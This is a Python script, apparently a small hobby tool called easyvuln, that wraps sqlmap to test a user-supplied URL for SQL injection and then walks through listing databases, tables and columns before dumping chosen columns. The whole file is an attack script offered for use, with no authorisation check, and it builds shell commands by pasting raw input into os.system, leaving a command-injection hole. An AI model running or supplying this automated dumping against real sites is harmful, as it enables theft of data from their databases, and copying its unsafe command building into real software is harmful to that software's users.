import os
import sys, string
import termcolor
import time as wait
def banner():
    print("""
███████╗ ██████╗ ██╗         ██╗███╗   ██╗████████╗███████╗██████╗ ███████╗ █████╗  ██████╗███████╗
██╔════╝██╔═══██╗██║         ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗██╔════╝██╔══██╗██╔════╝██╔════╝
███████╗██║   ██║██║         ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝█████╗  ███████║██║     █████╗  
╚════██║██║▄▄ ██║██║         ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗██╔══╝  ██╔══██║██║     ██╔══╝  
███████║╚██████╔╝███████╗    ██║██║ ╚████║   ██║   ███████╗██║  ██║██║     ██║  ██║╚██████╗███████╗
╚══════╝ ╚══▀▀═╝ ╚══════╝    ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝
                                                                                                   """)
def vulntest(inputs):
    os.system("cls")
    banner()
    os.system("python sqlmap.py -u "+inputs)
def testdbs(inputs):
    os.system("cls")
    banner()
    os.system("python sqlmap.py -u "+inputs+" --dbs")
def dumptables(inputs,tables):
    os.system("cls")
    banner()
    os.system("python sqlmap.py -u "+inputs+" -D "+tables+" --tables")
def dumpcolumn(inputs,tables,column):
    os.system("cls")
    banner()
    os.system("python sqlmap.py -u "+inputs+" -D "+tables+" -T "+column+" --columns")
def hackcolumn(inputs,tables,column,column2):
    os.system("cls")
    banner()
    os.system("python sqlmap.py -u "+inputs+"-D "+tables+" -T "+column+" -C "+ column2+" --dump")


target = input("Enter the Vuln Link | easyvuln >  ")
maincount = 1
os.system("cls")
try:
    while(maincount<2):
        if target == "quit":
            sys.exit()
        else:
            vulntest(target)
            iscontinue = input("Is the vulnerability found(Y/N) | easyvuln > ")
            count = 1
            while(count<2):
                if iscontinue == "y" or iscontinue == "yes" or iscontinue == "Y":
                    testdbs(target)
                    wait.sleep(4)
                    a = input("Enter The Database | easyvuln > ")
                    dumptables(target,a)
                    wait.sleep(4)
                    b = input("Enter The Tables | easyvuln > ")
                    dumpcolumn(target,a,b)
                    wait.sleep(4)
                    c = input("Enter The Column(s). e.g. 'columnName' or 'columnName,columnName2' | easyvuln > ")
                    hackcolumn(target,a,b,c)
                    wait.sleep(5)
                    tryagain = input("Would you like to do it again ?(y/n) | easyvuln > ")

                    if tryagain == "y" or tryagain == "Y":
                        count+=1
                    else:
                        print("GOOD BYE... ")
                        sys.exit()
                    




                    
                elif iscontinue == "n" or iscontinue == "N" or iscontinue == "no":
                    restart = input("Are you try again ?(y/n) | easyvuln > " )
                    if restart == "y" or restart == "Y":
                        os.system("cls")
                        vulntest(target)
                    else:
                        os.system("cls")
                        print("Good Bye...")
                        sys.exit()
except KeyboardInterrupt:
    print("Good Bye")
